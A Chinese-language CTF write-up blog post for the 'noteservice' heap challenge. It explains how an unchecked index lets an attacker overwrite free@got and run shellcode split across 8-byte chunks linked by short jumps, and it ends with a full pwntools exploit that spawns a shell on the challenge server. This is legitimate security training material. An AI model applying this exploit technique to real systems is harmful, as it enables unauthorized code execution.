---
layout: post
title: "noteservice"
date: 2024-7-17
tags: [pwn]
comments: true
author: gbeefee

---

第一次做堆题，到处找了不少wp（汗）

先看保护，pie和canary，问题不大，没什么

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/noteservice/0.png)

程序主体是一个菜单，实际上只实现了add和delete两个功能，edit和show都是假的。

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/noteservice/1.png)

注意到add里对index没有做限制，也就是可以通过下标对任意地址写。

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/noteservice/2.png)

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/noteservice/3.png)

但是，这个程序是开了pie保护的，又没有show可以暴露基址，想直接修改某个位置到想要的函数有难度，没开NX保护，可以考虑在堆上布置shellcode。

申请堆块基于2020A0，可以看到附近用很多函数的got表地址，可以挑一个合适的下手

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/noteservice/4.png)

利用调用该函数的时候执行我们的shellcode，这里就用free，这样只要在布置好shellcode后执行一次delete操作就可以执行shellcode了。

由于这个mallco限制size为8，mallco函数还会再数据末尾加个0或1，每个chunk可用的空间只剩下7个字节了，绝对不可能一次性写完所有shellcode，要考虑分多次写入，而我们申请的chunk也不是写入连续的字符，中间夹了一些其他数据，结构如图：

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/noteservice/5.png)

也就是说，我们需要在每一段的末尾加一个跳转指令，这样才能保证shellcode正确执行。这里选择短跳转指令"jmp short"，即\xeb，跳转长度为0x8+0x8+0x8+0x1= 0x19

shellcode要做的：

提供参数“/bin/sh"，eax赋值为59，rsi赋值0，rdx赋值0，rdi赋值0，最后syscall。

因为要保证chunk大小一致，每次申请的size都是8，有些指令长有些指令短，指令和jmp short中间又不能随意填充，比如\x00会直接截断，那就要用到滑板指令了

滑板指令，其实就是空指令或者是类空指令，空指令：0x90 类空指令：0x0A，0x0C，0x0D，这些指令执行后不会对我们的shellcode产生影响，可以帮助我们完成shellcode的执行。



完整exp：

```python
from pwn import *

#io = process('./note')
io = remote('61.147.171.105', 49678)
context(arch='amd64', os='linux', endian='little')

def add_note(idx, size, content):
    global io
    io.sendlineafter(b"your choice>> ", b'1')
    io.sendlineafter(b"index:", str(idx).encode())
    io.sendlineafter(b"size:", str(size).encode())
    io.sendlineafter(b"content:", content)
    
def delete_note(idx):
    global io
    io.sendlineafter(b"your choice>> ", b'4')
    io.sendlineafter(b"index:", str(idx).encode())

# 利用 jmp short s指令写shellcode
# 修改free@got处地址为堆地址
add_note(0, 8, b'/bin/sh')
add_note(-17 , 8, asm('xor rsi, rsi') + b'\x0C\x0C\xEB\x19')
add_note(1, 8, asm('xor rdx, rdx') + b'\x0C\x0C\xEB\x19')
add_note(2, 8, asm('mov eax, 59') + b'\xEB\x19')
add_note(4, 8, asm('syscall'))

delete_note(0)

io.interactive()

```

